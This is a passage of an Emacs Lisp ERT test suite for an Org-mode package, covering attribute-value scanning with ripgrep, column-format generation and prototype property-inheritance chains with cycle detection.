`org-agents--rg-files-for' answers `t' -- not nil -- when a name offered NO
pattern, because `org-agents--rg-name-p' rejects a space, a colon or a
non-ASCII character.  Treating that `t' as the empty list would silently
skip that name's value checks over the whole corpus.  So a name it cannot
narrow widens the tier to the WHOLE scope rather than to none of it.

MEASURED that both arms are real: `(org-agents--rg-name-p \"TWO WORDS\")'
and `(org-agents--rg-name-p \"CAFÉ\")' are both nil."
  (skip-unless (executable-find "rg"))
  (should-not (org-agents--rg-name-p "TWO WORDS"))
  (should-not (org-agents--rg-name-p "CAFÉ"))
  (should (org-agents--rg-name-p "STATUS"))
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("has.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:END:\n")
        ("hasnt.org" . "* E\n:PROPERTIES:\n:WIDGET: x\n:END:\n")
        ("neither.org" . "* E\n:PROPERTIES:\n:GADGET: y\n:END:\n"))
    (let ((root (org-agents--scope-root 'all)))
      ;; A narrowable declared name: only its own file is offered.
      (pcase-let ((`(,narrowed . ,flag)
                   (org-agents--attr-value-files files '("STATUS") root)))
        (should flag)
        (should (equal (list (funcall F "has.org")) narrowed)))
      ;; A name that offers no pattern: the WHOLE scope, not none of it.
      (pcase-let ((`(,wide . ,flag)
                   (org-agents--attr-value-files files '("TWO WORDS") root)))
        (should-not flag)
        (should (equal files wide)))
      ;; Mixed: one unnarrowable name widens the tier, it does not merely
      ;; contribute nothing.
      (pcase-let ((`(,wide . ,_)
                   (org-agents--attr-value-files
                    files '("STATUS" "TWO WORDS") root)))
        (should (equal files wide)))
      ;; An empty registry declares nothing, so nothing is read: which is
      ;; exactly right for the first seeding run, and is what makes tier
      ;; one alone answer a whole corpus.
      (pcase-let ((`(,none . ,_)
                   (org-agents--attr-value-files files nil root)))
        (should-not none)))))

(ert-deftest org-agents-test-attr-value-tier-reports-progress ()
  "A run that reads many files says so rather than appearing hung.
MEASURED, the value tier is 9 to 20 s at realistic registry sizes and its
floor is the ~4.5 ms it costs to open one file; over the author's corpus
the whole command was 6 s warm and 64 s cold.  Silence for that long,
while the buffer list grows into the thousands, is exactly the \"appears
hung\" this command was reported for.

On the FILE loop, where the count is known up front, and not per entry --
45,000 entries would make the reporter the cost.  Gated on
`org-agents--attr-progress-threshold' so that an `agenda' scope of a
handful of files gets no noise."
  (let ((made 0) (updated 0) (finished 0))
    (cl-letf (((symbol-function 'make-progress-reporter)
               (lambda (&rest _) (cl-incf made) 'stub))
              ((symbol-function 'progress-reporter-update)
               (lambda (&rest _) (cl-incf updated)))
              ((symbol-function 'progress-reporter-done)
               (lambda (&rest _) (cl-incf finished))))
      ;; Below the threshold: no reporter at all.
      (org-agents--attr-findings nil nil nil)
      (should (= 0 made))
      ;; Above it: made once, updated once per file, finished once.
      (let* ((n (+ 2 org-agents--attr-progress-threshold))
             (files (make-list n "/no/such/file/for/the/reporter.org")))
        (org-agents--attr-findings files nil nil)
        (should (= 1 made))
        (should (= n updated))
        (should (= 1 finished))))))

(ert-deftest org-agents-test-attr-findings-are-in-file-order ()
  "The report is sorted by file, then by line NUMERICALLY.
Required rather than tidy: the two tiers produce findings in different
orders -- one walks a census keyed by name, the other walks files -- and a
`compilation-mode' buffer that jumps backwards through a file is a worse
report than one that does not.  It is also what keeps
`org-agents-test-check-attributes-finds-each-kind''s positional assertions
true, and that coupling is otherwise invisible.

Numerically, or `:9:' sorts before `:10:' -- which is the whole reason the
sort parses the line rather than comparing the strings.  Asserted directly
on `org-agents--attr-sort', because arranging a corpus with a finding on
line 9 and another on line 10 of one file is possible but says less."
  (should (equal (org-agents--attr-sort
                  '("/a/b.org:10: ten" "/a/b.org:9: nine"
                    "/a/a.org:2: two" "/a/b.org:1: one"))
                 '("/a/a.org:2: two" "/a/b.org:1: one"
                   "/a/b.org:9: nine" "/a/b.org:10: ten")))
  ;; A line that does not parse keeps its place at the end rather than
  ;; being dropped: a report must not lose a finding to its own sort.
  (should (equal (org-agents--attr-sort
                  '("not a finding at all" "/a/a.org:1: one"))
                 '("/a/a.org:1: one" "not a finding at all")))
  ;; And end to end, over two files whose findings interleave.
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("a.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:WIDGET: x\n:END:\n")
        ("b.org" . "* E\n:PROPERTIES:\n:GADGET: y\n:END:\n"))
    (org-agents-check-attributes 'all)
    (let ((lines (org-agents-test--attr-finding-lines)))
      (should (= 3 (length lines)))
      (should (string-prefix-p (concat (funcall F "a.org") ":3:") (nth 0 lines)))
      (should (string-prefix-p (concat (funcall F "a.org") ":4:") (nth 1 lines)))
      (should (string-prefix-p (concat (funcall F "b.org") ":3:") (nth 2 lines))))))

(ert-deftest org-agents-test-attr-line-numbers-match-line-number-at-pos ()
  "The monotonic line cursor agrees with the function it replaced.
`line-number-at-pos' counts from `point-min' on every call, which is
quadratic within a large file and was one of the two accidental
quadratics that stopped the corpus lint finishing -- MEASURED at 1.8x on a
1,840-file sample.  `org-agents--attr-line-number' counts forward from
where it last was instead, which is only correct because the walk ascends;
this is what says the two agree, including across a backwards ask, which
must recompute rather than guess."
  (with-temp-buffer
    (insert "one\ntwo\nthree\nfour\nfive\nsix\nseven\n")
    (let ((cursor (cons (point-min) 1))
          (positions nil))
      (goto-char (point-min))
      (while (not (eobp))
        (push (line-beginning-position) positions)
        (forward-line 1))
      (setq positions (nreverse positions))
      ;; Ascending, which is the walk's own order.
      (dolist (pos positions)
        (should (= (line-number-at-pos pos)
                   (org-agents--attr-line-number cursor pos))))
      ;; And a backwards ask still answers correctly, by recomputing.
      (should (= (line-number-at-pos (nth 1 positions))
                 (org-agents--attr-line-number cursor (nth 1 positions)))))))

(ert-deftest org-agents-test-attr-findings-accumulate-linearly ()
  "Findings accumulate with `push', not by `nconc'ing onto the whole list.
`(setq findings (nconc findings fs))' once per file makes the cost the sum
of the findings SO FAR over every file -- quadratic in the number of
findings.  MEASURED over a 1,840-file sample of the author's corpus:
129.48 s with the `nconc' and 35.45 s with `push', and the term QUADRUPLES
over the full corpus because the findings roughly double.  That, and not
Org parsing, is where the 600-second kill came from: the same corpus's
walk with no findings built at all is 38.59 s.

Asserted by watching the LENGTH OF `nconc''s FIRST ARGUMENT rather than by
timing, and the choice of measure is the whole test.  A duration assertion
fails on a loaded machine and passes on a fast one.  Counting `nconc'
CALLS measures nothing either: the calls that matter are not the frequent
ones.  What `nconc' costs is walking its first argument to the end, so the
longest first argument it is ever handed is exactly the thing that was
quadratic.

Over N files each yielding one finding: the old form handed `nconc' the
accumulated list, so the longest first argument was N-1 and grew with the
corpus.  The `apply #'nconc' over per-file lists hands it the FIRST file's
findings, whose length has nothing to do with N."
  (let ((longest 0))
    (cl-letf* ((real (symbol-function 'nconc))
               ((symbol-function 'nconc)
                (lambda (&rest args)
                  ;; PRIMITIVES ONLY in here, and that is not a style
                  ;; choice: `nconc' is global, so this stub sees every
                  ;; caller in the process, and a `cl-every' inside it
                  ;; reaches `nconc' again and dies with
                  ;; `excessive-lisp-nesting'.  Observed.
                  ;;
                  ;; Only lists of FINDINGS are measured, for the same
                  ;; reason: Org's own calls pass through here too -- one
                  ;; of them hands `nconc' a 50-element list -- so a bare
                  ;; `length' would be measuring Org.
                  (let ((rest (car args)) (n 0) (ok t))
                    (while (and ok (consp rest))
                      (let ((x (car rest)))
                        (if (and (stringp x)
                                 (string-match-p "\\`/.*:[0-9]+: " x))
                            (setq n (1+ n) rest (cdr rest))
                          (setq ok nil))))
                    (when (and ok (null rest) (> n 0))
                      (setq longest (if (> n longest) n longest))))
                  (apply real args))))
      (org-agents-test--with-attr-corpus org-agents-test--registry-example
          '(("a.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:END:\n")
            ("b.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:END:\n")
            ("c.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:END:\n")
            ("d.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:END:\n")
            ("e.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:END:\n")
            ("f.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:END:\n")
            ("g.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:END:\n")
            ("h.org" . "* E\n:PROPERTIES:\n:STATUS: nope\n:END:\n"))
        (setq longest 0)
        (pcase-let ((`(,_entries . ,findings)
                     (org-agents--attr-findings files '("STATUS") nil)))
          ;; The run really did produce one finding per file, so the bound
          ;; below is a bound on something.
          (should (= 8 (length findings)))
          ;; Eight files, eight findings.  The old form's longest first
          ;; argument was seven; this must not grow with the corpus.
          (should (< longest (length files))))))))

(ert-deftest org-agents-test-attr-drawer-pattern-is-printable-ascii ()
  "The drawer pattern is printable ASCII, like every other pushed pattern.
`org-agents-test-rg-patterns-are-printable-ascii' walks the patterns
`org-agents--rg-patterns' builds, and a standalone `defconst' is outside
what that walk reaches.  The rule is the same one and holds for the same
reason: ripgrep decodes as UTF-8 while Emacs may decode an Org file as
latin-1, so a non-ASCII pattern can match LESS than Org does.

That it is a superset is asserted too, and directly: Org reads a property
only from a line inside a drawer, and `org-property-start-re' is what
opens one."
  (should (equal org-agents--rg-drawer-pattern
                 (encode-coding-string org-agents--rg-drawer-pattern
                                       'us-ascii)))
  ;; Every drawer opener Org itself accepts is matched by the pattern, the
  ;; escapes translated from ripgrep's dialect into Emacs's.
  (let ((emacs-form (replace-regexp-in-string
                     "\\[ \\\\t\\]" "[ \t]" org-agents--rg-drawer-pattern)))
    (dolist (line '(":PROPERTIES:" "  :PROPERTIES:" "\t:PROPERTIES:"
                    ":PROPERTIES:  "))
      (should (string-match-p org-property-start-re line))
      (should (string-match-p emacs-form line)))))

;; The `COLUMNS' generator.  There is no renderer here and there is not
;; meant to be one: `org-agenda-columns' already runs inside an
;; `org-ql-search' results buffer -- MEASURED -- so what was missing was a
;; format string, and this is it.  README's "Corpus-wide column view" is
;; the recipe those two facts add up to.

(defconst org-agents-test--registry-with-date
  (concat org-agents-test--registry-example "\
* DUE
:PROPERTIES:
:ATTR_TYPE: date
:END:
When this is wanted by.
")
  "The worked example plus a `date', which earns no summary operator.")

(ert-deftest org-agents-test-attribute-columns-format ()
  "`%ITEM' first, then one column per name, and `{+}' on the numbers only."
  (org-agents-test--with-registry org-agents-test--registry-with-date
    (should (equal (org-agents-attribute-columns '("STATUS" "REVIEWS" "DUE"))
                   "%ITEM %STATUS %REVIEWS{+} %DUE"))
    ;; And Org compiles it to exactly the columns that names, with the
    ;; operator on the one column that has one.
    (should (equal (org-columns-compile-format
                    (org-agents-attribute-columns '("STATUS" "REVIEWS" "DUE")))
                   '(("ITEM" "ITEM" nil nil nil)
                     ("STATUS" "STATUS" nil nil nil)
                     ("REVIEWS" "REVIEWS" nil "+" nil)
                     ("DUE" "DUE" nil nil nil))))
    ;; A boolean is text here, not a checkbox: `X' reads its column as
    ;; `[X]', and `true'/`false' is not that.
    (should (equal (org-agents-attribute-columns '("OPEN")) "%ITEM %OPEN"))))

(ert-deftest org-agents-test-attribute-columns-operators-are-real ()
  "Every operator emitted is one `org-columns' actually implements.
MEASURED, and this is why the assertion is worth making twice:
`org-columns-compile-format' validates NO operator at all -- `%X{nope}'
compiles to `(\"X\" \"X\" nil \"nope\" nil)' without a murmur -- so
nothing downstream would catch an invented one.  The guarantee is this
command's own, and `org-agents--attribute-column-operators' is where it
lives."
  (org-agents-test--with-registry org-agents-test--registry-with-date
    ;; The measured fact the assertion rests on, asserted so it cannot
    ;; quietly change underneath.
    (should (equal (org-columns-compile-format "%X{nope}")
                   '(("X" "X" nil "nope" nil))))
    (let ((format (org-agents-attribute-columns (org-agents-attributes)))
          (start 0))
      (while (string-match "{\\([^}]+\\)}" format start)
        (should (assoc (match-string 1 format)
                       org-columns-summary-types-default))
        (setq start (match-end 0)))
      ;; And there was one to check, so the loop is not vacuous.
      (should (string-match-p "{\\+}" format)))))

(ert-deftest org-agents-test-attribute-columns-refuses-undeclared ()
  "A name the registry does not declare is refused rather than emitted.
A `COLUMNS' line naming a property nothing declares renders an empty
column, which looks exactly like a property nothing has set -- so the
mistake would show up as a corpus with no data rather than as a mistake."
  (org-agents-test--with-registry org-agents-test--registry-with-date
    (let ((err (should-error (org-agents-attribute-columns '("STATUS" "NOPE"))
                             :type 'user-error)))
      (should (string-match-p "NOPE" (error-message-string err))))
    ;; And an empty request is refused too: `%ITEM' alone is not a column
    ;; view of anything.
    (should-error (org-agents-attribute-columns nil) :type 'user-error)))

(ert-deftest org-agents-test-attribute-columns-refuses-an-unspellable-name ()
  "A declared name a `COLUMNS' format cannot spell is refused as well.
`org-columns-compile-format' matches a column's property with `(in alnum
\"_-\")' and TRUNCATES at anything else, while Org accepts such a name as
a property perfectly well -- `org--valid-property-p' rejects only
whitespace.  So the registry can declare one, and emitting it produces
the very failure the undeclared-name guard exists to prevent: a silent,
always-empty column, here headed by half a name.

Both halves are MEASURED below: what Org does with such a format, and
that the command no longer produces one."
  (org-agents-test--with-registry "\
* WITH.DOT
:PROPERTIES:
:ATTR_TYPE: number
:END:
* HAS=EQ
:PROPERTIES:
:ATTR_TYPE: string
:END:
* PLAIN_NAME-2
:PROPERTIES:
:ATTR_TYPE: string
:END:
"
    ;; The reader declares all three: this is not a registry problem.
    (should (equal '("WITH.DOT" "HAS=EQ" "PLAIN_NAME-2")
                   (org-agents-attributes)))
    ;; What a format naming them would compile to -- the name truncated at
    ;; the punctuation, and the number's summary operator dropped with it.
    (should (equal (org-columns-compile-format "%WITH.DOT{+} %HAS=EQ")
                   '(("WITH" "WITH" nil nil nil)
                     ("HAS" "HAS" nil nil nil))))
    (dolist (name '("WITH.DOT" "HAS=EQ"))
      (let ((err (should-error (org-agents-attribute-columns (list name))
                              :type 'user-error)))
        (should (string-match-p (regexp-quote name)
                               (error-message-string err)))))
    ;; Alphanumerics, `_' and `-' are the class Org accepts, and they are
    ;; emitted, so the guard refuses nothing it should not.
    (should (equal (org-agents-attribute-columns '("PLAIN_NAME-2"))
                   "%ITEM %PLAIN_NAME-2"))
    (should (equal (org-columns-compile-format "%ITEM %PLAIN_NAME-2")
                   '(("ITEM" "ITEM" nil nil nil)
                     ("PLAIN_NAME-2" "PLAIN_NAME-2" nil nil nil))))))

(ert-deftest org-agents-test-attribute-columns-inserts-into-the-entry ()
  "With INSERT the format becomes the entry's `:COLUMNS:' property.
The property and not a `#+COLUMNS:' keyword, because that is what
descendants inherit and what `org-agenda-columns' reads for a matched
entry -- MEASURED, through the `(org-entry-get m \"COLUMNS\" t)' arm of
that function's own `cond', which `org-overriding-columns-format',
`org-local-columns-format' and `org-columns-default-format-for-agenda'
all outrank.  Not `org-columns-get-format', which reads `(org-entry-get
nil \"COLUMNS\" t)' and so answers for the agenda buffer itself."
  (org-agents-test--with-registry org-agents-test--registry-with-date
    (with-temp-buffer
      (let ((org-use-property-inheritance nil))
        (insert "* Class of thing\n")
        (org-mode)
        (goto-char (point-min))
        (let ((format (org-agents-attribute-columns '("STATUS" "REVIEWS") t)))
          (should (equal format "%ITEM %STATUS %REVIEWS{+}"))
          (should (equal format (org-entry-get nil "COLUMNS"))))
        ;; Without INSERT nothing is written.
        (org-entry-delete nil "COLUMNS")
        (org-agents-attribute-columns '("STATUS"))
        (should-not (org-entry-get nil "COLUMNS"))))))

;;;; Prototypes

(defconst org-agents-test--prototype-registry "\
* STATUS
:PROPERTIES:
:ATTR_TYPE:    string
:ATTR_VALUES:  open wip blocked done
:ATTR_DEFAULT: open
:END:
Where the item stands.

* OWNER
:PROPERTIES:
:ATTR_TYPE: string
:END:
Who has it.

* REVIEWS
:PROPERTIES:
:ATTR_TYPE: number
:END:
How many times this has been through review.

* Prototypes
** Task
:PROPERTIES:
:OWNER:       johnw
:REVIEWS:     7
:CATEGORY:    masters
:DEADLINE:    <2030-01-01 Tue>
:AGENT_QUERY: (todo)
:AGENT_VIEW:  table
:END:
The master every task follows.

** Urgent Task
:PROPERTIES:
:PROTOTYPE: Task
:OWNER:     ada
:END:
A task that is urgent, which is a Task in every other respect.
"
  "A registry declaring three attributes and two prototypes.
One file, because prototypes live in a `Prototypes' section of the
registry rather than in a file of their own -- which is what keeps this
epic from adding an option.

The three attributes are chosen so that each step of the resolution
order is visible on its own: `OWNER' is spelled by BOTH prototypes, so
nearest-first shows; `REVIEWS' only by `Task', so the far end of the
chain shows; and `STATUS' by NEITHER, so the registry default is the only
thing that can answer for it.")

(defconst org-agents-test--prototype-corpus
  '(("follower.org" . "\
* TODO Ship the widget
:PROPERTIES:
:PROTOTYPE: Urgent Task
:END:
* TODO Ship the gadget
:PROPERTIES:
:PROTOTYPE: Urgent Task
:OWNER:     zoe
:END:
* TODO Ship on its own
:PROPERTIES:
:REVIEWS: 1
:END:
"))
  "Three followers: one plain, one overriding locally, one with no prototype.")

(defmacro org-agents-test--at-entry (file heading &rest body)
  "Run BODY with point on the entry of FILE whose heading text holds HEADING.
FILE is visited rather than copied, so a test may edit it and see what
the resolver then reads."
  (declare (indent 2))
  `(with-current-buffer (find-file-noselect ,file)
     (goto-char (point-min))
     (should (re-search-forward (concat "^\\*+.*" (regexp-quote ,heading))
                                nil t))
     (org-back-to-heading t)
     ,@body))

(ert-deftest org-agents-test-prototype-resolves-through-a-chain ()
  "A follower reads what it does not spell, through the chain, nearest first.
`OWNER' is spelled by both hops, so the answer is the NEAR one; `REVIEWS'
only by the far one, so the walk does not stop at the first hop that
lacks the attribute."
  (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
      org-agents-test--prototype-corpus
    (org-agents-test--at-entry (funcall F "follower.org") "Ship the widget"
      (should (equal "ada" (org-agents-resolve-property "OWNER")))
      (should (equal "7" (org-agents-resolve-property "REVIEWS")))
      ;; Case-insensitively, as the tiers around it are.  `org-entry-get'
      ;; upcases a key for step 3 and `org-agents-attribute' matches a
      ;; declaration case-insensitively for step 5, but step 4 is
      ;; case-insensitive only by the CASE-FOLD argument to
      ;; `assoc-string' -- MEASURED, dropping it left the whole suite
      ;; green while a lowercase name resolved locally and from the
      ;; registry and nowhere in between.
      (should (equal "ada" (org-agents-resolve-property "owner")))
      (should (equal "7" (org-agents-resolve-property "reviews")))
      (should (equal "7" (org-agents-resolve-property "Reviews"))))))

(ert-deftest org-agents-test-prototype-local-value-wins ()
  "A value the entry spells for itself outranks every prototype."
  (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
      org-agents-test--prototype-corpus
    (org-agents-test--at-entry (funcall F "follower.org") "Ship the gadget"
      (should (equal "zoe" (org-agents-resolve-property "OWNER")))
      ;; And the chain still answers for what the entry does not spell.
      (should (equal "7" (org-agents-resolve-property "REVIEWS"))))))

(ert-deftest org-agents-test-prototype-default-is-the-last-resort ()
  "`:ATTR_DEFAULT:' answers where neither the entry nor its chain does.
`STATUS' is spelled by no entry in the fixture at all, so the registry is
the only thing that can answer for it -- and an attribute the registry
does not declare answers nil rather than something."
  (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
      org-agents-test--prototype-corpus
    (org-agents-test--at-entry (funcall F "follower.org") "Ship the widget"
      (should (equal "open" (org-agents-resolve-property "STATUS")))
      (should-not (org-agents-resolve-property "UNDECLARED")))
    ;; An entry with no prototype at all reaches the default too.
    (org-agents-test--at-entry (funcall F "follower.org") "Ship on its own"
      (should (equal "open" (org-agents-resolve-property "STATUS")))
      (should (equal "1" (org-agents-resolve-property "REVIEWS"))))))

(ert-deftest org-agents-test-prototype-outline-ancestor-is-not-consulted ()
  "Containment is not inheritance: the local step must NOT inherit.
This is the test the prefilter's soundness argument rests on.  An
inheriting local read answers from three places no drawer line of the
entry's own file spells: an ANCESTOR's drawer, a `#+PROPERTY:' file
keyword, and `org-global-properties' -- the last of which is in no file
at all.  Were any of them in the resolution order, the pushed
alternation could not see the value and the file would be lost with no
error.

`$NAME*' is the outline axis and is spelled differently on purpose; see
`org-agents-test-expand-three-axes-are-three-predicates'."
  (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
      '(("outline.org" . "\
#+PROPERTY: OWNER fromkeyword
* Parent
:PROPERTIES:
:STATUS: blocked
:END:
** Child
:PROPERTIES:
:REVIEWS: 2
:END:
"))
    (let ((org-use-property-inheritance t)
          (org-global-properties '(("GLOB" . "fromglobal"))))
      (org-agents-test--at-entry (funcall F "outline.org") "Child"
        ;; The premise: an inheriting read DOES answer, all three ways.
        (should (equal "blocked" (org-entry-get nil "STATUS" t)))
        (should (equal "fromkeyword" (org-entry-get nil "OWNER" t)))
        (should (equal "fromglobal" (org-entry-get nil "GLOB" t)))
        ;; And the resolver answers none of them.
        (should (equal "open" (org-agents-resolve-property "STATUS")))
        (should-not (org-agents-resolve-property "OWNER"))
        (should-not (org-agents-resolve-property "GLOB"))))))

(ert-deftest org-agents-test-prototype-cycle-names-the-cycle ()
  "A cycle in the chain is a `user-error' naming the hops, in order.
Signalled by the public API, which a command and a fontifier call
directly; `org-agents-resolve-property-quietly' is what a predicate body
uses, and it reports instead -- see
`org-agents-test-prototype-cycle-is-reported-once'."
  (org-agents-test--with-attr-corpus "\
* Prototypes
** A
:PROPERTIES:
:PROTOTYPE: B
:END:
** B
:PROPERTIES:
:PROTOTYPE: A
:END:
"
      '(("cyc.org" . "\
* TODO Round and round
:PROPERTIES:
:PROTOTYPE: A
:END:
"))
    (org-agents-test--at-entry (funcall F "cyc.org") "Round and round"
      (let ((err (should-error (org-agents-resolve-property "OWNER")
                              :type 'user-error)))
        (should (string-match-p "cycle" (error-message-string err)))
        (should (string-match-p "A -> B -> A" (error-message-string err)))))))

(ert-deftest org-agents-test-prototype-cycle-is-reported-once ()
  "Twenty entries into one cycle cost ONE message and no signal.
A `user-error' out of a predicate body aborts the agent's whole update --
`org-agents-update-all' catches `user-error' per agent and would report
the agent as failed on account of one drawer's typo -- so the quiet
resolver demotes the signal to a report, deduplicated by
`org-agents--prototype-warned'."
  (org-agents-test--with-attr-corpus "\
* Prototypes
** A
:PROPERTIES:
:PROTOTYPE: B
:END:
** B
:PROPERTIES:
:PROTOTYPE: A
:END:
"
      '(("cyc.org" . "\
* TODO Round and round
:PROPERTIES:
:PROTOTYPE: A
:END:
"))
    (org-agents-test--at-entry (funcall F "cyc.org") "Round and round"
      (let* ((org-agents--prototype-warned (make-hash-table :test #'equal))
             (texts (org-agents-test--messages
                      (dotimes (_ 20)
                        (should-not
                         (org-agents-resolve-property-quietly "OWNER"))))))
        (should (= 1 (length texts)))
        (should (string-match-p "A -> B -> A" (car texts)))))))

(ert-deftest org-agents-test-prototype-cycle-mixing-name-and-id-names-two-hops ()
  "A cycle spelled once by name and once by `id:' is TWO hops, not four.
The visited set has to be one key space for the diagnostic to be true.
Keyed per spelling -- a downcased name for a named master, `FILE:POSITION'
for an id-named one -- the same entry gets two keys, the walk goes one hop
past the cycle before a key repeats, and the message MEASURED before the
fix was `Alpha -> Beta -> Alpha -> Beta': four masters named where there
are two, and no way to see where the cycle closed.

The design explicitly permits mixing the spellings, so this is a corpus a
user can write.  No test in the suite built one before."
  (let ((uuid "1f2e3d4c-5b6a-7890-abcd-ef0123456789"))
    (org-agents-test--with-attr-corpus (concat "\
* Prototypes
** Alpha
:PROPERTIES:
:ID: " uuid "
:PROTOTYPE: Beta
:END:
** Beta
:PROPERTIES:
:PROTOTYPE: id:" uuid "
:END:
")
        '(("mixed.org" . "\
* TODO Round and round, two ways
:PROPERTIES:
:PROTOTYPE: Alpha
:END:
"))
      ;; The id half needs org-id to know where the master lives; the
      ;; fixture starts with an empty table on purpose.
      (puthash uuid registry org-id-locations)
      (org-agents-test--at-entry (funcall F "mixed.org") "Round and round"
        (let* ((err (should-error (org-agents-resolve-property "OWNER")
                                 :type 'user-error))
               (text (error-message-string err)))
          (should (string-match-p "cycle" text))
          ;; Closed at Alpha, and named once per hop.
          (should (string-match-p "Alpha -> Beta -> Alpha" text))
          ;; And NOT walked past it.
          (should-not (string-match-p "Alpha -> Beta -> Alpha -> Beta" text)))))))

(ert-deftest org-agents-test-prototype-chain-is-bounded-independently ()
  "The walk is bounded by a hop count as well as by the visited set.
The visited set alone is sound, and this is not about soundness: it is
about which failure a regression produces.  MEASURED, neutering the cycle
branch of `org-agents--prototype-chain' did not fail
`org-agents-test-prototype-cycle-names-the-cycle' -- it hung the suite
until the runner's timeout, printing no `Ran N tests' line at all, which
in CI reads as an infrastructure flake rather than as the cycle
regression it is.  The counter makes that a signal instead.

Exercised by lowering the bound over a legitimate chain, since the
mutation that would otherwise reach it is the one this exists to catch.
The message says `cycle' too, so a walk that reaches the bound satisfies
the assertions the cycle tests already make."
  (org-agents-test--with-attr-corpus "\
* Prototypes
** P0
:PROPERTIES:
:PROTOTYPE: P1
:END:
** P1
:PROPERTIES:
:PROTOTYPE: P2
:END:
** P2
:PROPERTIES:
:PROTOTYPE: P3
:END:
** P3
:PROPERTIES:
:OWNER: deep
:END:
"
      '(("deep.org" . "\
* TODO Four hops down
:PROPERTIES:
:PROTOTYPE: P0
:END:
"))
    (org-agents-test--at-entry (funcall F "deep.org") "Four hops down"
      ;; At the shipped bound the chain is ordinary and resolves.
      (should (equal "deep" (org-agents-resolve-property "OWNER")))
      ;; Below it the walk refuses, and says so the way a cycle does.
      (let* ((org-agents--prototype-chain-limit 2)
             (err (should-error (org-agents-resolve-property "OWNER")
                               :type 'user-error))
             (text (error-message-string err)))
        (should (string-match-p "cycle" text))
        (should (string-match-p "P0 -> P1" text)))
      ;; A bound of one hop still names the hop it stopped at.
      (let ((org-agents--prototype-chain-limit 1))
        (should-error (org-agents-resolve-property "OWNER")
                      :type 'user-error)))))

(ert-deftest org-agents-test-prototype-dangling-is-one-diagnostic ()
  "A `:PROTOTYPE:' naming nothing is ONE message, and resolution answers nil.
Twenty entries naming the same missing prototype say it once and name an
entry, because the report is keyed on the REFERENCE while its text names
where the reference was first met.  A `user-error' here would cost the
whole update for one typo."
  (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
      '(("dangle.org" . "\
* TODO Names nothing
:PROPERTIES:
:PROTOTYPE: Nosuchthing
:END:
"))
    (org-agents-test--at-entry (funcall F "dangle.org") "Names nothing"
      (let* ((org-agents--prototype-warned (make-hash-table :test #'equal))
             (texts (org-agents-test--messages
                      (dotimes (_ 20)
                        ;; The registry default still answers, which is
                        ;; what makes this a diagnostic and not a failure.
                        (should (equal "open"
                                       (org-agents-resolve-property "STATUS")))
                        (should-not
                         (org-agents-resolve-property "OWNER"))))))
        (should (= 1 (length texts)))
        (should (string-match-p "Nosuchthing" (car texts)))
        (should (string-match-p "Names nothing" (car texts)))))))

(ert-deftest org-agents-test-prototype-agent-properties-never-travel ()
  "Behaviour does not travel: no `AGENT_' name resolves through a prototype.
A prototype that lent its `:AGENT_QUERY:' would make every follower an
agent, and a declared `:ATTR_DEFAULT:' for such a name would make every
entry in the corpus one.  So an `AGENT_' name is resolved from the
entry's own drawer and from nothing else -- no chain, no default."
  (org-agents-test--with-attr-corpus "\
* AGENT_VIEW
:PROPERTIES:
:ATTR_TYPE:    string
:ATTR_DEFAULT: table
:END:
Deliberately declared, to prove a default cannot smuggle behaviour in.

* Prototypes
** Task
:PROPERTIES:
:AGENT_QUERY: (todo)
:AGENT_VIEW:  list
:AGENT_SCOPE: all
:OWNER:       johnw
:END:
"
      '(("f.org" . "\
* TODO Follows a master that is an agent
:PROPERTIES:
:PROTOTYPE:  Task
:AGENT_VIEW: table
:END:
"))
    (org-agents-test--at-entry (funcall F "f.org") "Follows a master"
      ;; Nothing behavioural travels.
      (should-not (org-agents-resolve-property "AGENT_QUERY"))
      (should-not (org-agents-resolve-property "AGENT_SCOPE"))
      ;; Not even where the registry declares a default for it.
      (should (equal "table" (org-agents-resolve-property "AGENT_VIEW")))
      ;; Case is Org's, not ours: a lower-case spelling is the same name.
      (should-not (org-agents-resolve-property "agent_query"))
      ;; And an ordinary attribute still travels, so the refusal is
      ;; specific rather than a chain that does not work.
      (should (equal "johnw" (org-agents-resolve-property "OWNER"))))))

(ert-deftest org-agents-test-prototype-property-does-not-travel ()
  "`PROTOTYPE' itself resolves locally, and no DEFAULT may supply one.
A declared `:ATTR_DEFAULT:' for `PROTOTYPE' would hand every entry in the
corpus a master -- one line in the registry and the whole corpus follows
one prototype -- so the name is opaque and step 5 never reaches it.

This is the reachable half of that refusal, and the only half.  MEASURED:
the chain arm cannot be reached, because the walk finds its hops with
`org-entry-get' rather than through the resolver, so with A -> B -> C an
entry following A resolves `PROTOTYPE' to `\"A\"' whether the name is
opaque or not.  A test resting on that would assert nothing."
  (org-agents-test--with-attr-corpus "\
* PROTOTYPE
:PROPERTIES:
:ATTR_TYPE:    string
:ATTR_DEFAULT: A
:END:
Declared on purpose, to prove a default cannot supply a master.

* OWNER
:PROPERTIES:
:ATTR_TYPE: string
:END:

* Prototypes
** A
:PROPERTIES:
:PROTOTYPE: B
:END:
** B
:PROPERTIES:
:PROTOTYPE: C
:END:
** C
:PROPERTIES:
:OWNER: johnw
:END:
"
      '(("f.org" . "\
* TODO Follows A
:PROPERTIES:
:PROTOTYPE: A
:END:
* TODO Follows nothing at all
:PROPERTIES:
:OWNER: solo
:END:
"))
    (org-agents-test--at-entry (funcall F "f.org") "Follows A"
      ;; The reference the entry spells, and never the next hop.
      (should (equal "A" (org-agents-resolve-property "PROTOTYPE")))
      ;; The chain is walked to its end for an ordinary attribute.
      (should (equal "johnw" (org-agents-resolve-property "OWNER"))))
    ;; The half that discriminates: an entry that names no master has
    ;; none, whatever the registry declares.
    (org-agents-test--at-entry (funcall F "f.org") "Follows nothing at all"
      (should-not (org-agents-resolve-property "PROTOTYPE"))
      (should (equal "solo" (org-agents-resolve-property "OWNER"))))))

(ert-deftest org-agents-test-prototype-special-property-is-local-only ()
